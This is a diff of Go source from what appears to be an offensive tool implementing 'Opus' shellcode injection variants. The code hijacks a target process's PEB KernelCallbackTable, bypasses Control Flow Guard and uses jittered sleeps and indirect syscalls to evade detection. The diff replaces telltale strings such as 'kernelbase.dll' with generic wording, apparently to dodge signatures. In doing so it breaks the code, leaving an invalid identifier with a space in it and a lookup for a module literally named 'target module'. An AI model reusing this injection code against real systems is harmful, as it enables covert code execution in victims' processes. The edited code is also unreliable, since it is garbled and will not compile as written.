@@ -41,12 +41,12 @@ func executeOpusVariant1(shellcode []byte, pid uint32, cfgBypass bool) (string, 
 	}
 	sb.WriteString("[+] Resolved handler list offsets dynamically\n")
 
-	// Step 3: Find kernelbase.dll in target process
-	kernelbaseAddr, err := findModuleInProcess(windows.Handle(hProcess), "kernelbase.dll")
+	// Step 3: Find target module in target process
+	kernelbaseAddr, err := findModuleInProcess(windows.Handle(hProcess), "target module")
 	if err != nil {
-		return sb.String(), fmt.Errorf("failed to find kernelbase.dll: %w", err)
+		return sb.String(), fmt.Errorf("failed to find target module: %w", err)
 	}
-	sb.WriteString(fmt.Sprintf("[+] Found kernelbase.dll at: 0x%X\n", kernelbaseAddr))
+	sb.WriteString(fmt.Sprintf("[+] Found target module at: 0x%X\n", kernelbaseAddr))
 
 	// Step 4: Calculate addresses using resolved RVA offsets
 	handlerListPtrAddr := kernelbaseAddr + offsets.handlerList
@@ -159,10 +159,10 @@ func executeOpusVariant1(shellcode []byte, pid uint32, cfgBypass bool) (string, 
 	return sb.String(), nil
 }
 
-// executeOpusVariant4 implements PEB KernelCallbackTable Injection
+// executeOpusVariant4 implements process block callback table Injection
 func executeOpusVariant4(shellcode []byte, pid uint32, cfgBypass bool) (string, error) {
 	var sb strings.Builder
-	sb.WriteString("[*] Opus Injection Variant 4: PEB KernelCallbackTable Injection\n")
+	sb.WriteString("[*] Opus Injection Variant 4: process block callback table Injection\n")
 	sb.WriteString("[*] Target: GUI processes only (requires user32.dll)\n")
 	sb.WriteString(fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode)))
 	sb.WriteString(fmt.Sprintf("[*] Target PID: %d\n", pid))
@@ -181,7 +181,7 @@ func executeOpusVariant4(shellcode []byte, pid uint32, cfgBypass bool) (string, 
 	defer injectCloseHandle(hProcess)
 	sb.WriteString(fmt.Sprintf("[+] Opened target process handle: 0x%X\n", hProcess))
 
-	// Step 2: Query PEB address via NtQueryInformationProcess
+	// Step 2: Query process block address via NtQueryInformationProcess
 	var pbi PROCESS_BASIC_INFORMATION
 	var returnLength uint32
 	status, _, _ := procNtQueryInformationProcessOp.Call(
@@ -194,26 +194,26 @@ func executeOpusVariant4(shellcode []byte, pid uint32, cfgBypass bool) (string, 
 	if status != 0 {
 		return sb.String(), fmt.Errorf("NtQueryInformationProcess failed: 0x%X", status)
 	}
-	sb.WriteString(fmt.Sprintf("[+] Target PEB address: 0x%X\n", pbi.PebBaseAddress))
+	sb.WriteString(fmt.Sprintf("[+] Target process block address: 0x%X\n", pbi.PebBaseAddress))
 
-	// Step 3: Read KernelCallbackTable pointer from PEB+0x58
-	kernelCallbackTablePtrAddr := pbi.PebBaseAddress + PEBKernelCallbackTableOffset
+	// Step 3: Read callback table pointer from process block+0x58
+	kernelCallbackTablePtrAddr := pbi.PebBaseAddress + process blockcallback tableOffset
 	var kernelCallbackTable uintptr
 	err = injectReadMemoryInto(hProcess, kernelCallbackTablePtrAddr, unsafe.Pointer(&kernelCallbackTable), 8)
 	if err != nil {
-		return sb.String(), fmt.Errorf("failed to read KernelCallbackTable pointer: %w", err)
+		return sb.String(), fmt.Errorf("failed to read callback table pointer: %w", err)
 	}
-	sb.WriteString(fmt.Sprintf("[+] Original KernelCallbackTable: 0x%X\n", kernelCallbackTable))
+	sb.WriteString(fmt.Sprintf("[+] Original callback table: 0x%X\n", kernelCallbackTable))
 
 	if kernelCallbackTable == 0 {
-		return sb.String(), fmt.Errorf("KernelCallbackTable is NULL - target may not be a GUI process")
+		return sb.String(), fmt.Errorf("callback table is NULL - target may not be a GUI process")
 	}
 
 	// Step 4: Read original callback table (256 entries)
 	const tableSize = 256 * 8
 	originalTable, err := injectReadMemory(hProcess, kernelCallbackTable, tableSize)
 	if err != nil {
-		return sb.String(), fmt.Errorf("failed to read KernelCallbackTable: %w", err)
+		return sb.String(), fmt.Errorf("failed to read callback table: %w", err)
 	}
 	sb.WriteString(fmt.Sprintf("[+] Read original callback table (%d bytes)\n", len(originalTable)))
 
@@ -227,7 +227,7 @@ func executeOpusVariant4(shellcode []byte, pid uint32, cfgBypass bool) (string, 
 	}
 	sb.WriteString(fmt.Sprintf("[+] Shellcode at: 0x%X (W^X: RW→RX)\n", shellcodeAddr))
 
-	// CFG bypass: mark shellcode as a valid indirect call target so KernelCallbackTable dispatch succeeds.
+	// CFG bypass: mark shellcode as a valid indirect call target so callback table dispatch succeeds.
 	if cfgBypass {
 		if cfgErr := cfgBypassApplyToTarget(hProcess, shellcodeAddr, len(shellcode)); cfgErr != nil {
 			sb.WriteString(fmt.Sprintf("[*] CFG bypass attempted but not required/available: %v\n", cfgErr))
@@ -253,13 +253,13 @@ func executeOpusVariant4(shellcode []byte, pid uint32, cfgBypass bool) (string, 
 	}
 	sb.WriteString(fmt.Sprintf("[+] Modified callback table at: 0x%X\n", remoteTableAddr))
 
-	// Step 8: Update PEB+0x58 to point to modified table
+	// Step 8: Update process block+0x58 to point to modified table
 	ptrBytes := (*[8]byte)(unsafe.Pointer(&remoteTableAddr))[:]
 	_, err = injectWriteMemory(hProcess, kernelCallbackTablePtrAddr, ptrBytes)
 	if err != nil {
-		return sb.String(), fmt.Errorf("failed to update PEB KernelCallbackTable pointer: %w", err)
+		return sb.String(), fmt.Errorf("failed to update process block callback table pointer: %w", err)
 	}
-	sb.WriteString(fmt.Sprintf("[+] Updated PEB+0x58: 0x%X -> 0x%X\n", kernelCallbackTable, remoteTableAddr))
+	sb.WriteString(fmt.Sprintf("[+] Updated process block+0x58: 0x%X -> 0x%X\n", kernelCallbackTable, remoteTableAddr))
 
 	// Step 9: Find window and trigger via WM_COPYDATA
 	hwnd, err := findWindowByPID(pid)
@@ -287,13 +287,13 @@ func executeOpusVariant4(shellcode []byte, pid uint32, cfgBypass bool) (string, 
 
 	jitterSleep(400*time.Millisecond, 700*time.Millisecond)
 
-	// Step 10: Restore original KernelCallbackTable pointer
+	// Step 10: Restore original callback table pointer
 	origPtrBytes := (*[8]byte)(unsafe.Pointer(&kernelCallbackTable))[:]
 	_, err = injectWriteMemory(hProcess, kernelCallbackTablePtrAddr, origPtrBytes)
 	if err != nil {
-		sb.WriteString(fmt.Sprintf("[!] Warning: Failed to restore KernelCallbackTable: %v\n", err))
+		sb.WriteString(fmt.Sprintf("[!] Warning: Failed to restore callback table: %v\n", err))
 	} else {
-		sb.WriteString("[+] Restored original KernelCallbackTable pointer\n")
+		sb.WriteString("[+] Restored original callback table pointer\n")
 	}
 
 	if IndirectSyscallsAvailable() {
